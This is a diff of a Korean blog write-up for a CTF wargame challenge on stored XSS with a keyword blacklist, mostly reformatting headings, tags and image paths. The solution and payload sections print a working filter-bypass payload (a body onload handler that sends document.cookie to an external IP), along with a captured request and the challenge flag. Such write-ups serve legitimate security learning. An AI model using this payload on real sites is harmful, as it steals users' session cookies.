@@ -1,58 +1,36 @@
 ---
-title: "[Writeup] Knockon Bootcamp 2nd - 5.1 xss_WAF_1"
+title: "KnockOn Bootcamp 2nd - 5.1 XSS WAF 1"
 categories:
   - Web Hacking
 tags:
   - Wargame
-  - Knockon Bootcamp 2nd
-  - Cross Site Scripting
+  - KnockOn Bootcamp 2nd
+  - XSS
   - Stored XSS
   - Filter Bypass
-last_modified_at: 2024-09-08T18:30:00-05:00
+last_modified_at: 2024-09-09T08:30:00+09:00
 published: true
 ---
-
-|
-
 ## 문제
 
 <http://war.knock-on.org:10040/>
 
-![5.1 xss_WAF_1 1](/assets/images/writeup/web-hacking/knock-on/5-1_XSS_1.png)
+![5.1 xss_WAF_1 1](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-5-1-xss-1.png)
 
-![5.1 xss_WAF_1 2](/assets/images/writeup/web-hacking/knock-on/5-1_XSS_2.png)
+![5.1 xss_WAF_1 2](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-5-1-xss-2.png)
 
-![5.1 xss_WAF_1 3](/assets/images/writeup/web-hacking/knock-on/5-1_XSS_3.png)
-
-
-|
-
-|
-
-|
+![5.1 xss_WAF_1 3](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-5-1-xss-3.png)
 
 ### 목표
 
----
-
 게시판에 악성 스크립트를 추가하여 쿠키 값 탈취하기
 
-|
-
 ### 공격 기법
-
----
 
 Cross Site Scripting
 
 - Stored XSS
 - Filter Bypass
-
-|
-
-|
-
-|
 
 ## 문제 코드
 
@@ -197,17 +175,9 @@ if __name__ == "__main__":
 
 ```
 
-|
-
-|
-
-|
-
 ## 코드 분석
 
 ### add_post()
-
----
 
 ```python
 black_list = ["script","img","error"]
@@ -229,23 +199,15 @@ def add_post():
 
 `content`에서 `script, img, error`를 필터링함. 이것만 없으면 됨
 
-|
-
-|
-
-|
-
-## Exploit
+## 풀이
 
 ```html
 <body onload="location.href='http://20.41.120.97:10010/'+document.cookie">
 ```
 
-![5.1 xss_WAF_1 4](/assets/images/writeup/web-hacking/knock-on/5-1_XSS_4.png)
+![5.1 xss_WAF_1 4](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-5-1-xss-4.png)
 
 `<body>`태그의 `onload`속성을 이용
-
-|
 
 ### 결과
 
@@ -260,30 +222,14 @@ Referer: http://localhost:10006/
 Accept-Encoding: gzip, deflate
 ```
 
-|
-
-|
-
-|
-
-## Payload
+## 페이로드
 
 ```html
 <body onload="location.href='http://20.41.120.97:10010/'+document.cookie">
 ```
 
-|
-
-|
-
 ### FLAG
-
----
 
 ```bash
 K0{ne3w_j34n5_1s_g0d}
 ```
-
-|
-
----
